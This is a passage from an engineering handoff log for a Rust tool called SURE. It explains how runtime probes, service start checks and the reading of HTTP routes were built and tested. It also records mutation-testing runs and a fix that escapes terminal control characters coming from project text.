`app`, the name it is a call on; `let mut app = …` and `let app: Router = …` bind
no name at all. In a file where the true receiver is nested under a prefix,
asking the declared path could get an answer from a different route and report a
**pass** for a path the project does not serve. **Nothing in the product
constructs a `RouteReading` yet** — `lib.rs` declares the module, `schedule.rs`
holds the reason, and every construction in the workspace is in a test — so it is
not reachable in a verdict today, and the falsifier is the task that wires the
reading into the schedule, which must decide the three together rather than the
first alone. It is carried below and in `DECISIONS.md` with that falsifier.
## What `P5-T003` added

**The one thing about `P5-T003` a reader should know before the detail: the
module is the second half of a sentence another module had already written.** The
task's acceptance is *"Known local routes can be probed safely"* and *"Response
evidence is bound to run/fingerprint"*, and the first was not a gap in the
product's plans — it was a gap `runtime_probes.rs` had **named and refused to
paper over** one task earlier: *a probe that asked whether `/api/health` answers
would have to name where SURE read that a route exists, and nothing in the
discovery holds one — a `package.json` declares scripts and dependencies, not
routes*. So `crates/sure-core/src/http_routes.rs` is a **reading** first and a
probe second, and the anchor is not decoration on it: `Route::declared_in` with
`Route::line` is the whole answer to that paragraph, and
`a_route_read_from_a_file_is_anchored_at_the_line_that_states_it` reads the file
back off disk and asserts that the line the anchor names contains the route the
anchor names. A `line` off by one would leave every other test in the file green
and the product's central claim false.

**"Known" means one line states the method and the path, and the third column of
the reading's table decides every verdict.** Three stacks — a Flask or FastAPI
decorator, an Express statement, a Rust `.route(...)` chain — and **each needs a
different rule for when the path it names is the whole path, because each stacks
mounts differently.** In Python and JavaScript the rule is *the receiver must be
the application object*: `app.use("/api", router)` mounts another object and
moves nothing already declared, so a route on `router.get("/health")` has a real
path that depends on a line which may not even be in the file being read. In Rust
the application object is not distinguishable from a nested router — both are
`Router::new()` — so the rule runs the other way: the chain's name must not
appear as the argument of a `nest(` or `merge(` call in the same file. **Every
uncertain case is a `NotProbed` with a reason rather than a probe**, which is
`runtime_probes::NotPlanned`'s shape and for its reason: a route that produced no
check would produce no row, and a reader takes the absence of a row for the
absence of a problem. `NotProbedBecause` has ten arms.

**One request line, and the two ways a route is not asked for its method are
different claims.** `probe.rs` writes exactly one request line —
`GET <path> HTTP/1.1` — so `HEAD` and `OPTIONS` are reads by HTTP's meaning and
**not reads this product can make**, while a `POST` is a request that would change
a project's data to see whether it works. `WouldChangeSomething` is a claim about
the project and `NotTheReadSureAsks` is a claim about SURE, and collapsing them
would make SURE's own limitation read as a fact about the project. A path with a
slot in it (`/items/{item_id}`, `/items/<int:item_id>`, `/items/:id`) is read and
not asked for the same kind of reason: inventing a value for the slot — `1`,
`test` — would be SURE asking a question the project never offered, and a `404` on
`/items/1` is not evidence about `/items/{item_id}`. `HasASlot` is that refusal.

**Safety is a property of the constructors rather than of the module's care, and
the one thing the module could get wrong on its own is *where* it asks.** The
address is loopback because `Endpoint` refuses anything that is not
`IpAddr::is_loopback` (so a route probe is `ActionKind::LocalProbe` and needs
`Permission::Inspect`, which the vocabulary grants unconditionally); the method is
`GET`; and nothing is written but one request line and three headers, which is
`probe.rs`'s existing argument. What is left is the path, and that is what the
third column above is for. **A route read from the source and asked at the wrong
path is a working project reported as broken, and the integration tests hold the
claim at a socket rather than by reading the module's own intent** — the
listener's thread is the only thing that can say what actually arrived.

**The fingerprint is read from the plan rather than taken as a parameter.** Every
`CheckResult` this module produces carries `Enforcement::check_plan()`'s
fingerprint, for the reason `StartSmoke::of` gives about the same line: a
fingerprint that arrived separately is one that could describe a project state the
command was not admitted for. `EVIDENCE_MODEL.md`'s test-freshness rule is what
that field serves, and `RouteSmoke` has no constructor that omits it.

**The change is one source file, one test file, one line of `lib.rs`, and one
reason added to the schedule's vocabulary.** `crates/sure-core/src/http_routes.rs`
is new at **1952** lines — nine public types, twelve unit tests, and a module
document with the three-stack table above and a "What this does not do" section —
and `crates/sure-core/tests/http_routes.rs` is new at **1508** lines with
**twelve** integration tests over real workspaces and a real socket.
`lib.rs` gains one line; `schedule.rs` gains `CheckReason::RouteDeclared
{ declared_in, route, line }` with its three arms (a sentence, `names_something`
rejecting `line == 0`, and an anchor whose subject is `AnchorSubject::LineRange`
and whose location is the file); `tests/check_schedule.rs` gains one `MAY_PROPOSE`
entry.

### The two security-relevant defects this task found, and how they were found

**Two push reviews named this module and each found a real instance of the class
this repository treats as the most serious one, and the second is the one that
says what was wrong with the first fix.** The first carried no finding text, so the
module's surface was read directly instead of answered: **a route's path and the file it was read from are both project
text, and both go *inside* a sentence SURE prints** rather than being handed to a
renderer as a field, because they are what a reader needs in order to find the
thing SURE is talking about. `quoted` returns the characters between a literal's
quotes unchanged, so a project whose source file holds a **real** control byte
inside a route's string reaches SURE's own output carrying it, and a failing route
could **erase the report of its own failure as a person was reading it** — a false
green in the terminal rather than in a verdict, and the hardest kind to notice
afterwards because the JSON would have been right. The treatment already existed
in the workspace (`setup.rs`'s `in_a_sentence`, `runtime_start.rs`,
`diagnostics::Field`, all on `redact::escape_control_characters`) and this module
had not used it, so the first fix was one private `in_a_sentence` at **five** call
sites: `spelling`, `Route::anchor`'s location, `Route::plain_description`,
`NotProbed::plain_description`, and `RouteCheck::of`'s
`CheckReason::RouteDeclared.declared_in` — the last escaped at the boundary rather
than inside `schedule.rs`, because one escape there covers both the sentence and
the anchor that reason builds.

**Five call sites is an enumeration, and the sixth review's second finding is the
hole in it.** That finding named `NotProbedBecause`'s own sentence, and it is real:
two of the enum's ten arms interpolate **a mount call's prefix** and **the name a
route is declared on**, and both of those are read out of the project's source.
The enumeration had been done one call site at a time and this sentence had been
passed over — and the reason it was passed over is written into the module, which
is what makes it worth recording rather than just fixing: **the doc comment stated
that this sentence was SURE's own text.** It was not, for those two arms. The
correction is therefore *not* a sixth call site: the escape moved to where the
sentence is composed, `in_a_sentence(&match self { ... })` around the whole
`match`, so **one call covers every arm that exists and every arm added later** —
which is the property an enumeration cannot have. `RouteCheck::of` already had that
shape for the same reason. The new test does not read a workspace and cannot: it
constructs the two arms with a real escape byte inside them, because **Windows
forbids bytes 0—31 in a file name**, so the arm's input is not reachable through
the filesystem on the primary platform, and an integration test is not a place to
assert a property the platform will not produce. It was seen to fail before it was
trusted: with the boundary replaced by the identity, the single test failed on the
real byte.

**`Route::path` is deliberately not escaped**: it is
what SURE asks for, and a request line built from an escaped path would ask for
something the project does not serve. The tests assert the invariant — no control
character survives in six sentences a reader gets — rather than the two characters
that prompted it, and they also assert that this is an escape and not a
redaction, since deleting the byte would satisfy the invariant while leaving a
reader unable to see what the project actually wrote.

**One adjacent gap was found and deliberately not fixed.** `env_completeness.rs`
builds a sentence and an anchor location from `display_path` without escaping
either, so the same defect class is present one module over. It is pre-existing
and outside this task's scope — `P5-T003` adds a file, and a fix there would be a
change to a module this task otherwise does not touch, measured by a suite whose
anchors were not aimed at it. The falsifier is the ordinary one: **a task that
touches that module fixes it there, with its own evidence.**

### The mutation set was red twice, and the second red is the one that mattered

**Thirty-five rows over the one source file, and the set has now been run four
times: the first left one row that did not compile and five that survived, the
second left one survivor, the third was stopped in flight when the second review
changed the source under it, and the fourth is the log this task is accepted on.**
**The accepted log is `all 35 observable mutations caught by a failing test, and 0 declared unobservable as expected`** — 35 rows, 0 survivors, 0 that failed to build, 0 skipped, and 0 whose anchor did not apply. **The survivors are worth more than the count, and the second
run's is the most serious thing this set found.**

- **The second run's survivor is a false green one field to the left of the
  status.** *A route that failed is reported as a warning* replaces the two
  constants `RouteSmoke::run` hands to `Outcome::verdict` — `Severity::MustFix,
  true` becomes `Severity::Note, false` — so it breaks **two** properties at once
  and neither was asserted anywhere. `CheckResult::blocks_green` returns `false`
  the moment `critical` is `false`, so **a route the project declares and does not
  serve stops blocking green**: a reader would be told the project is fit to hand
  off while the one check that noticed the missing route had been quietly demoted.
  **The existing assertion in the test named for exactly this behaviour —
  `!aggregate(&results).is_green()` — could not catch it, and the reason is precise
  rather than an oversight**: a failed check is never green whatever its weight, so
  the aggregate stays not-green and the row survives on the *weaker* verdict.
  Asserting the verdict is not asserting the weight. **The file already asserted a
  route check's severity and critical flag one test away, where the *proposal* is
  built** — `tests/http_routes.rs:682-683` — and that assertion cannot see these,
  because `RouteSmoke::run` passes its own constants and a **result's** weight is a
  second decision made in a different place. It is closed by three assertions in
  `a_route_the_service_does_not_have_is_a_failure_and_not_a_missing_row` — the
  severity, the flag, and `blocks_green()` itself, the third being the derived
  property a reader is actually misled by. **The catch was verified by hand before
  the set was re-run**, because a test written to close a survivor is a claim until
  it is seen to fail: the two constants swapped, the single test run, `FAILED` at
  `crates/sure-core/tests/http_routes.rs:1278` with `left: Note / right: MustFix`
  and exit 101, the file restored and confirmed byte-equal to the snapshot, and only
  then the harness restarted.

**The first run's five survivors were five different kinds of gap, and not one was
closed by weakening a row** — which is why they are still listed here from the run
that no longer counts:

- **A fixture that could not reach the rule.** The receiver test in
  `read_javascript` is only consulted in a file that binds **both** the
  application and something else, and `src/router.js` binds only `router` — so the
  early return skipped the file and the mutation was invisible. The code was right
  and the fixture was thin; the fix is a router **in `src/app.js`**, the file that
  also holds `app`, whose `/admin` joins `NOT_READ`. `src/router.js`'s two routes
  were never able to carry that claim and were being read as if they could.
- **A rule that nothing distinguished.** `chain.or(bound)` against
  `bound.or(chain)` agree on every input the reading reaches in valid Rust,
  because a line that binds a name *and* continues a chain is a line whose
  statement ran past its end — a missing `;`, which is a thing an AI writing Rust
  produces and therefore an input this product exists to read. The ordering is now
  a rule with its reason asserted next to it: the receiver is what the call is on,
  and the binding is only what the expression becomes.
- **A row whose name was a false claim.** *Two routes on one path in one file are
  one check* mutates the **route's spelling** half of the identifier, so every
  check in one file shares an identifier — not the collision its name described.
  Renamed, and the property is asserted in three parts by
  `a_check_read_from_a_file_is_named_by_the_route_and_not_only_by_the_file`: two
  checks in one file are two identifiers, one route in two files is two
  identifiers, and the same project read out of two directories is the same set of
  identifiers. **A mutation's name is a claim, and this one was wrong.**
- **A sentence nothing read.** The loop that walks the reasons compared each
  sentence against **the reason it is built from**, so a reason that stopped saying
  the path had moved satisfied it: the assertion was checking the sentence against
  itself. The assertion now names the prefix and the clause, because a mount is the
  one reason where the sentence has to say more than a name.
- **A byte a file name cannot hold where the test looked.** **Windows forbids
  bytes 0–31 in a file name**, so the file-name half of the escaping is reachable
  on Unix and macOS (where every byte but NUL and `/` is legal) and unreachable
  through the filesystem on the primary platform — which is why the module's own
  unit test constructs the `Route` and asserts over
  `NotProbed::plain_description` instead of reading a workspace. An integration
  test is not a place to assert a property the platform will not produce.
- **The sixth did not compile, and the harness was right to refuse it.** The row
  meant to report a failing route as a warning used `Severity::Minor`, which does
  not exist — the vocabulary is `MustFix`, `ShouldFixFirst`, `CanFixLater`,
  `Note`. A `DID NOT COMPILE` is kept in its own list and can never reach
  `CAUGHT`, because a suite that did not build says nothing about whether a test
  would have noticed, and recording it as caught would have been a false green in
  the mutation record itself. The row was repaired to `Severity::Note, false` — and
  **that repaired row is the one that survived the second run, which is a
  coincidence worth noticing and not a lesson**: the two failures share nothing but
  a name, and reading the first as having predicted the second would be exactly the
  kind of pattern this file refuses to assert.

**The set was stopped mid-run twice, and the two stops are different lessons.**
The first kill left its mutation applied to the file — the third time on this
branch — and the harness prints no `restored` line, so it is checked rather than
assumed: `target/tmp/http_routes.rs.pre` is a byte copy taken before the run, and it
exists because **this file is new and has no committed blob to hash against**,
which is what the rule against `request.rs` (`git show HEAD:<path>`) cannot do
here. It is what caught the kill: the worktree copy came back 13 bytes shorter than
the snapshot. The file was restored from the snapshot, the edit that prompted the
stop was made, the snapshot was re-taken, and the set was re-run.

**The second stop was a decision rather than an accident, and the rule it applies
is the one this section keeps restating**: the sixth review's second finding
arrived while the third run was in flight, the finding was real, and the fix
changed the source — so that run could only ever produce a catch list for a tree
that no longer existed. **A run measuring a dead tree is worth nothing and costs
twenty-five minutes**, so it was stopped rather than left to finish, and its log is
the artefact that says so at 0 bytes. The file it had mutated was restored and
checked byte-equal against the snapshot's hash before the fix was applied, which is
the order the next paragraph is about.

**A set is evidence about one tree, and the three trees before this one no longer
exist** — both the source and the test file changed under them — so a catch list from
any of them is not a catch list for this one. Generalised rule: *check a state
against a copy the harness does not own — `HEAD` where there is one, a snapshot where
there is not.*

**And the snapshot's order in the procedure is load-bearing, which this run learned
by getting it wrong.** The copy has to be taken **after** the last source change and
**before** the harness starts. A copy taken before the new test was written is one
that restoring will **delete the test from** — which is what happened here on the
first attempt, and it was caught by the test filter matching zero tests rather than
by reading the file back. The restore is checked byte-equal against a hash recorded
in the session, not against the file it just overwrote.

### Three reading shapes found while closing the survivors, recorded and not fixed

They are one rule rather than three defects — a route's name is *a plain
identifier on the left of one `=`* — and they are the same narrowness the module
documents, except that the first answers with the **wrong name** rather than with
nothing:

- `let api = app.route("/health", get(health));` on one line is attributed to
  **`api`**, the name the expression *becomes*, rather than to `app`, the name it
  is a call on.
- `let mut app = Router::new().route(...)` binds no name, because `mut app` is not
  a plain identifier, so the route is reported as *on something SURE cannot name*.
- `let app: Router = Router::new().route(...)` binds no name for the same reason,
  one character later.

**The first is the one that matters**: a wrong name is a route SURE believes it
placed, and in a file where the true receiver is nested under a prefix, SURE
asking the declared path could get an answer from a different route and report a
**pass** for a path the project does not serve. Nothing in the product constructs
a `RouteReading` yet, so it is not reachable in a verdict today — which is the
reason it is recorded rather than fixed inside a task whose acceptance is about
probing the routes the reading *does* place. **The falsifier is the task that
wires this reading into the schedule, and it must decide the three together rather
than the first alone.**

### What `P5-T003` did not do

**Nothing in the product constructs a `RouteReading` yet.** `lib.rs` declares the
module, `schedule.rs` holds the reason a route check is written with, and every
construction in the workspace is in a test — the same ceiling `support.rs` records
for `StartSmoke` and `tests/spawn_sites.rs` checks. The module is a unit with its
own tests and no caller until the schedule-to-runner step exists. **The safety
work is in now because the module is new and the next task builds on it, not
because anything was reachable**, and it is worth saying which half *is* reachable:
the reading takes a project's bytes as input, so the sentences it composes are the
first place a project's text meets SURE's output on this path. It also does not
start a service (`P5-T002`'s `StartSmoke`), run a browser (`P5-T004`), resolve a
mount that lives in another file, split a command line, or decide whether a probe
may run — that is `PlanBuilder`'s and the domain's `decide`.
## What `P5-T002` added

**The one thing about `P5-T002` a reader should know before the detail: its
acceptance is two sentences and the second is the one that shapes the module.**
*"Supported service can be started/probed/terminated"* is a claim about a real
process doing three things in order; *"Startup failure remains explicit"* is the
claim that none of the ways that process can disappoint SURE ends up looking like
success. The module is arranged so that the second sentence is structural rather
than documented: **the table of endings is total**, every arm of it has a status,
and the two arms that could be mistaken for a pass are the two the tests are
written against.

**The chain, and the door this module comes in through.** `ProbePlan::of` →
`PermissionPlan::add` → `Enforcement::of` → `Supervisor::start` → `StartSmoke::run`,
and `StartSmoke::of` takes an **`Enforcement`** rather than a command. That is
`enforce.rs`'s own rule applied one level up: the module looks the admitted command
up **by the probe's own check id**, so a smoke check cannot run a command that a
mode stopped, and cannot run one that was planned for a different check. Two tests
hold the halves of that, and the second one is the interesting one: the enforcement
admits **two** commands and the decoy is admitted **first**, so a lookup that took
the first command it found would take the wrong one — the decoy's child writes a
marker on its way out and the test asserts the marker is not there. Without the
decoy the test would be about the plan rather than about the lookup.

**The verdict table has five rows, and the row with two ways in is the one a
start check exists for.** *It ended by itself* is a failure whether it ended
inside the window or after it, in two sentences that differ in which fact they
lead with — **a service that exits is not a service, whatever it printed on the
way out**, and `start` is the one script whose whole meaning is *this keeps
running*. A start that came up, answered SURE's question and then ended by itself
is therefore a failure too, which is the case a check that only asked about the
port would have called green. The other three rows are the pass — **the probe's
own status, carried rather than re-decided**, which is what keeps this module from
becoming a second opinion about what a port said — the warning for a service that
came up with nothing to ask, and two `error` rows for a program that never started
and a run SURE cannot vouch for.

**A question is only asked while the process SURE started is still running, and
that is a rule rather than an ordering.** A port that answers after SURE's own
process is gone may be answering for something SURE did not start — a leftover
from a previous run, another server on the machine, or a child the start script
detached — and a pass built on that would be a claim about a service SURE never
saw come up. The test that holds it asserts the **absence** of the asked clause in
a reason about a service that had already ended, which is a claim about a sentence
SURE did not write.

**The hardest row needed a second process, and the first instrument for it was
flaky rather than slow.** *A service that outlived the window and then ended by
itself* is decided by `observe()`, which asks its question and then calls `stop()`
with microseconds in between, while the runner's wait loop checks `try_wait()`
before the deadline and before the cancellation and sleeps 1 ms. When the death
and the end of the exchange are the same instant — which is what a service that
ends **because** it was asked produces — the runner can poll in that gap and
report `Cancelled`, which is the wrong row; the test failed as `left: Error,
right: Fail` under load. **The fix is not a longer sleep.** The port has to belong
to a **different process** than the one that dies: the service starts an *anchor*,
the anchor holds the question open, the service ends when the **anchor reports
that the question arrived**, and the anchor waits a further 100 ms and only then
lets the connection go. Every ordering in that instrument is carried by a marker
file rather than by two clocks agreeing, and the test asserts all three markers —
including the give-up marker that must **not** exist. That shape is not a
contrivance for a test: a real dev server is exactly this, since `npm run dev`
starts a server and is not itself the server, so the process SURE supervises can
end while the port it opened is still answering.

**Windows hands an accepted socket the listener's non-blocking mode, and that cost
a test before it was understood.** `P3-T010`'s `serve()` sets its listener
non-blocking on purpose — a child nobody ever connects to has to have a way out —
Windows inherits that onto every socket it accepts, and Unix does not. The child's
read returned `WouldBlock` with the request still in the socket, the child closed,
and the far end reported a **connection reset**; the failure read *the exchange
could not be made (os error 10054)*. The chain from there is three steps and each
is forced: a reset is an *abortive* close, which the operating system sends only
when the closing side still had unread bytes; the request was still unread, so the
read that was supposed to take it had returned without it; and a blocking read
cannot return before the bytes arrive. The fix is one line —
`stream.set_nonblocking(false)` after every `accept` — written as an explicit call
rather than a `cfg(windows)` branch, because the socket is being asked to be
blocking, which is what the code that reads it has always assumed. **The comment
that explains it was corrected once by measurement**: its first draft claimed the
child "read nothing at all", and removing the line left the test passing, because
the parent's write usually beats the child's read. It is a race and not a zero,
and the comment now says so.

**The one row whose status is the platform's, and the reason it is asserted as a
set.** `Termination::TimedOut` is reachable in one ordering only: the service
outlives the window and the exchange is still open when the service's whole-life
budget expires. The test that reaches it gives a **silent** service a 2 second
window, a 3.5 second budget and a 6 second exchange bound, and it found two
things. The first is that **SURE's own kill lands in the middle of an open
exchange and the two systems report that differently**: on Windows a socket is
aborted when the process holding it is force-terminated, so the probe sees a reset
and reports *the exchange could not be made* (`Unreachable`, which `probe.rs` maps
to `error`); on Unix the kernel closes the socket, so the probe sees the
connection end with nothing said and reports *an open port is not an answer*
(`NoAnswer`, mapped to `unknown`). Both are what the probe saw, the module carries
the probe's verdict rather than replacing it with an opinion of its own, and
neither is a pass — but **the same run reports `error` on Windows and `unknown` on
Unix**, which is asserted as a set in the test rather than pinned to this
machine's answer and belongs in the v0.1 report's limitations. The second finding
is a sentence: the arm read *"the service ran until its own 3.5 seconds budget ran
out"*, which is not English, and no test had ever read it because no test had ever
reached the arm. It now reads *"its own budget of 3.5 seconds ran out"*, which is
right for every duration `spoken` produces.

**The service's output is quoted for a person to read, so it is escaped before it
is quoted — and this is the one thing in the module that a push review prompted
rather than the task.** The review named `runtime_start.rs` and carried no finding
text, so the module's security surface was read directly, and this is what it
turned up: `last_words` places a service's own bytes inside a sentence SURE writes,
and a service is a project's process. `\n` cannot get through — it is what the
lines were split on — but `text_lossy` replaces only what is not valid UTF-8, so
every other control character can: a lone `\r` sends a terminal's carriage to
column 0, and `\x1b[2K` erases the line it is printed on. **A failing service could
therefore erase SURE's report of its own failure while a person was reading it**,
which is a false green in the terminal rather than in the verdict. The workspace
already had the answer and this module simply had not used it — `setup.rs`'s
`in_a_sentence` escapes project text for exactly this reason, in exactly these
words, and `diagnostics::Field` does the same for a value in a message. Two
details are decisions rather than mechanics: the escaping is applied **before**
`QUOTED_CHARS` rather than after, so the constant's own doc (*the quote is bounded
... by characters*) keeps being true of what a reader sees, since the escape
sequence a service wrote is six characters of SURE's report; and the test asserts
the **invariant** — no control character survives — rather than the two characters
that prompted it, while also asserting that the service's words are still quoted
and each control character is shown as the escape it is. A test that only checked
for `\x1b` would pass on a module that had learned one character and not the rule.
It is fixed in `0b72dce`, and the catch was verified the way this branch verifies
one: the call removed by hand, the test run, `FAILED` at exit 101, and the file
restored to its committed hash.

**The tests were taught four things after the set's first run, and none of them was
one of the set's own anchors.** The fingerprint on a result was asserted nowhere,
so a module that generated its own would have survived; the *absence* of the asked
clause for a service that had ended was asserted nowhere; the dropped-line count in
a reason was asserted only where a hand-built outcome lives and never against a
real process; and the `DIE` child wrote **one** line, so *the tail and not the head*
had no head to drop. Each is now held by a test: the child writes seven lines of
noise before the sentence that says why, the reason has to name the three that were
dropped and the fourth that was kept, the answering test asserts the fingerprint the
plan admitted under and the stream the service wrote on, and the failing test
asserts both that SURE said which ending it was and that it did not ask a question
of a service that was already gone.

**What this module does not do, and one thing it cannot do yet.** It does not split
a command line: turning a project's declared `start` script into a program and an
argument vector is the executor's work, one step before this module, and **there is
no such step in the crate** — so nothing in the product builds a `StartSmoke`, which
is the state `support.rs`'s ceiling paragraph now records and the fourth census rule
checks. It does not read a body (`P5-T003`'s routes and `P5-T004`'s browser check
are the feature claims), it does not run two services (`P5-T007`), and it does not
decide whether a probe may run — that is `PlanBuilder`'s and, through it, the
domain's `decide`.

**And when the splitter is written, the batch-file question reaches the serve
path.** Windows completes a name with no extension with `.exe` and nothing else, so
a bare `npm` is not found where `npm.cmd` is installed, and a `.cmd`/`.bat` **named
with its extension** is classified `Destructive`, which no permission covers in any
mode. So on Windows a Node project's `start` script cannot be started in this build
by either spelling — for a reason that is documented, open, and the owner's to
settle (`HANDOFF.md`'s decisions list, item 26). That is not a defect in this
module, which runs what it is handed; it is the price of the question being open,
and it is worth knowing that the price is a whole ecosystem's start scripts rather
than a corner case.

## What `P5-T001` added

**The one thing about `P5-T001` a reader should know before the detail: its
acceptance is a single sentence and it is three claims, and the interesting part
of the task is that two of the three were already answered somewhere else.**
*"Runtime probes specify execution/network requirements and target component."*
**Execution and network requirements** are the `ActionKind` a probe declares —
one per probe — and the requirements are derived from it by
`CheckProposal::new` and read back through `ExecutionRequirements`, which is
where `can_touch_network` lives. **The target component** is a `Component`'s own
path looked up in the `ComponentGraph`. Neither of those is a sentence this
module invented; both are the domain's and the schedule's own vocabulary, and
the module's job was to be the *first* thing to put a probe into it. The third
claim is the one with no prior owner: that a probe is a **`CheckProposal`**, not
a description of one, so it drops into a `CheckSchedule` with nothing anywhere
deciding twice what a check is.

**`start` and `dev` finally have a consumer, and the promise they were waiting on
was written down a phase before it could be kept.** `checks/node.rs` explains why
four of `ScriptRole`'s eight variants produce checks and four do not:

> *`dev` and `start` **do not finish**. They are servers, and a check is
> something that ends. Starting one is what `service` and `checks.browser_probe`
> are for, with their own permissions and their own timeouts.*

That sentence was written when those two roles had **no consumer at all**.
`runtime_probes` is it: `ScriptRole::Start` and `ScriptRole::Dev` are read here
and nowhere else in the shipped source, and the command they yield is the command
a probe would run. The task's second contribution to `node.rs` is a doc paragraph
that says so, and the first is four `pub(crate)` widenings — `Runner`,
`Runner::of`, `components`, `command_for` — each carrying its own paragraph
naming `P5-T001` as the second caller. **A widening whose documentation does not
say who else is calling it is indistinguishable from a visibility change nobody
needed**, and the two modules agree about *which package manager runs this
project's scripts*, *which manifests SURE read* and *which of the three
missing-command facts applies* because there is one answer to each rather than
two that happen to match today.

**Two kinds, and the absences are the decisions.** `Serve` is
`ActionKind::StartService`, `MustFix` and critical; `Interface` is
`ActionKind::BrowserProbe`, `ShouldFixFirst` and not critical. A **route check**
is absent because `CheckReason`'s own rule refuses it: a probe asking whether
`/api/health` answers would have to name where SURE read that a route exists, and
nothing in the discovery holds one — a `package.json` declares scripts and
dependencies, not routes — so the reason would name a file that says no such
thing. Routes are `P5-T003`'s and they arrive with the reading that can point at
them. `ActionKind::ExternalService` is absent as **a boundary rather than a
gap**: reaching a real payment or mail system is `P5-T006`'s subject, and a local
check planned here would be this module inventing a local substitute for a check
that is not local. `ActionKind::ArbitraryCommand` is absent as **forbidden**:
`P5-T005` says a project may describe safe local acceptance flows *without
arbitrary free-form shell*, and the way to hold that is for the only actions a
probe can declare to be actions with a meaning. **There is no field here a caller
could put a command line in** — the string a probe carries is the project's own
declared script, rendered by the package manager that runs it, and `ProbePlan::of`
is the only constructor.

**`auto` and `always` are not decorative, and they answer differently for the two
kinds — which is why each row carries its own answer rather than the module
deciding once.** `Auto` is documented as *"run it when the discovered project
shape suggests it is worth running"*, and the two kinds can see different amounts
of that shape. A `start` script in a `package.json` **is** the shape that
suggests a service. There is no manifest field anywhere that says a project has
an interface — not in the discovery, not in this crate — so under `auto` an
interface probe would be SURE deciding from nothing that a project has a
browser-visible surface. `auto` therefore plans a serve probe, plans **no**
interface probe, and **says so** in `ProbePlan::not_planned` rather than leaving a
reader to assume an interface was checked and was fine. `always` is how to ask for
one, and the authority for that is `CheckPreference`'s own documentation rather
than anything this module adds — *"`Always` is a preference about effort, never a
grant of authority"* — so an interface probe still needs
`Permission::ConnectService` and is still refused under `InspectOnly`. `never`
produces the two `ScopeReduction`s and **no per-component gap**, because the
reduction is already the project-wide record of a whole class of check being
switched off and a per-component gap beside it would be a second, longer way of
saying one thing the user did on purpose.

**A component with no way to start is a value and not a silence, and the
vocabulary is `checks`' rather than a new one.** `NotPlanned` is
`MissingCommand`'s shape one level up, for that type's own reason: a check that
cannot be proposed produces no plan entry, so a report built from the plan would
say **nothing at all** about a project SURE could not start, and a reader takes
the absence of a row for the absence of a problem. `NotACommand` is the variant
worth spelling out — a `package.json` with `"start": {}` is a manifest that
declared something, and a report that called it *"no start script"* would be
describing a broken manifest as a project that never wrote one. **That sentence is
the one the mutation set proved was prose and nothing more**, and it is `m25`
below.

**One action per probe, and capability and cost are two questions the domain
answers separately.** `ActionKind::StartService` requires
`Permission::RunProjectCode` **and** answers `can_touch_network() == true`. The
temptation to add a second `NetworkAccess` action is refused in both directions:
it would add no capability, because the first action already answers yes — but it
*would* add `Permission::Network` to the check's requirements, and that
permission is about reaching **beyond this machine**. Requiring it to talk to
`127.0.0.1` would ask a user to grant something the check does not need, which is
the shape `ExecutionRequirements::blocked_by`'s own documentation warns about
from the other end: *a prompt that named something the user had already granted
is a sentence asking them to do something they have done.* No convenience
accessor renames either half — a caller asking *can this reach the network* reads
the domain's answer — and the module says so where it could have smoothed the two
together.

**The weights are a fourth vocabulary and they were checked as one.** Each row of
`PROBES` carries severity, criticality, evidence class and whether `auto` plans
it. The first two and the last are arguments about **consequence** rather than
about numbers, and a consequence can only be read where a consequence is used: a
result built from a schedule. `a_probe_carries_the_weight_it_argues_for_and_nothing_louder`
builds an inspect-only schedule and asserts, per kind, that
`CheckResult::blocks_green()` answers `true` for a stopped serve probe and
`false` for a stopped interface probe. **That test was written before the
mutation set was run**, on the observation that nothing asserted a probe's
severity, its criticality or its evidence class at all — and it is the sole
catcher of four of the twenty-five rows below, which would otherwise have
survived.

**The module has no caller in this crate yet, and that is a state rather than a
gap.** The seam is public and a later task wires it; `NodeChecks` was in the same
state one phase earlier. It runs nothing, starts nothing and opens nothing —
there is no `Command`, no port, no timeout and no browser here, and the running
is `P5-T002`'s, `P5-T003`'s and `P5-T004`'s work. It reads nothing: every fact is
a field of a discovery result. It does not decide whether a probe is allowed to
run, which is `PlanBuilder`'s and through it the domain's `decide`. And it does
not witness that a service is *good* — a project whose start script is
`"start": "sleep 600"` gets a serve probe and so does one whose start script
exits immediately, because whether the thing that came up is the thing the
project means is not a question a table of roles can answer.

**The mutation set found two real gaps on its first run, and one of them is the
paragraph above about `NotACommand`.** Twenty-five rows over the single source file this
task adds, empty test filter on every row so that a survivor is a mutation the whole
crate's suite missed rather than one a narrow filter never looked at. Run 1 — against the
tree as first written — left **`m20` and `m25` surviving with 0 tests catching each**:
23 caught, 2 survivors, 0 inconclusive, and all 25 restores verified by blob hash.

- **`m20` reverses the plan's own line order** — `plain_description` returning the gaps
  before the probes — and survived because **nothing asserted the order of the plan's own
  report**. The integration file asserted membership, the module asserted membership, and
  **a claim about membership is not a claim about order**; a plan whose two halves swap
  places reads to a user as a report that leads with what SURE could not do. Closed by
  `the_plan_reads_what_it_would_do_before_what_it_would_not`, which is now the only test
  that catches it.
- **`m25` makes every missing command read as one that was never declared** — the precise
  substitution the paragraph above argues against, where a `package.json` with
  `"start": {}` is described as a project that never wrote a start script. It survived
  because **nothing held the four explanations apart in the place they are actually
  rendered**: `checks/mod.rs` does assert that `MissingKind`'s four sentences are pairwise
  distinct, but over `MissingKind::plain_explanation()` rather than over the sentence a
  gap shows through `NotPlannedBecause`, so an assertion about the same four strings sat
  in the suite while the row that swaps them survived it. Closed by
  `runtime_probes::tests::the_ways_a_manifest_can_leave_sure_without_a_command_read_differently`,
  which is likewise its only catcher.

**The set was then run a third time, against the tree that was committed, and that third
log is the record.** Run 1 measured a tree hashing to `d51684a7`; the two closing tests
landed after it, so rows `m20`–`m25` were re-run in run 2 against a tree hashing to
`997295ab`, and each former survivor was caught by exactly one test. **Neither blob is in
the object database** — `git cat-file -t` answers *could not get object info* for both,
because the intermediate content was never staged — so a later reader cannot diff them to
see whether the difference mattered, and the whole twenty-five row set was run again
against the committed blob `15d1dad186d8117116f784fd33a297002a688942`. That is not
ceremony: **`m3` is caught by two tests in run 1 and by three in the committed run**, the
third being one of the two closing tests, which is exactly the kind of difference a
two-vintage log cannot represent and a reader cannot check.

**Run 3 is 25 rows, 25 caught, 0 survivors, 0 inconclusive, and its invariants are
checked rather than assumed.** 24 of the 25 rows hold **45 well-formed `test result:`
lines** and `passed + failed = 1308`; **in all 25 rows the catch count equals the row's
own number of failed tests**, which is the identity that closes the one row that is not
pristine. All 25 rows print *restored to the pre-run blob*, and `git hash-object` on the
worktree file afterwards answers `15d1dad1…` — the committed blob — so the tree the set
measured is the tree the commit holds.

**One row's log is not pristine, and it costs the reading nothing.** `m18` holds 44
well-formed result lines and a total of 1307, because one one-test binary's summary line
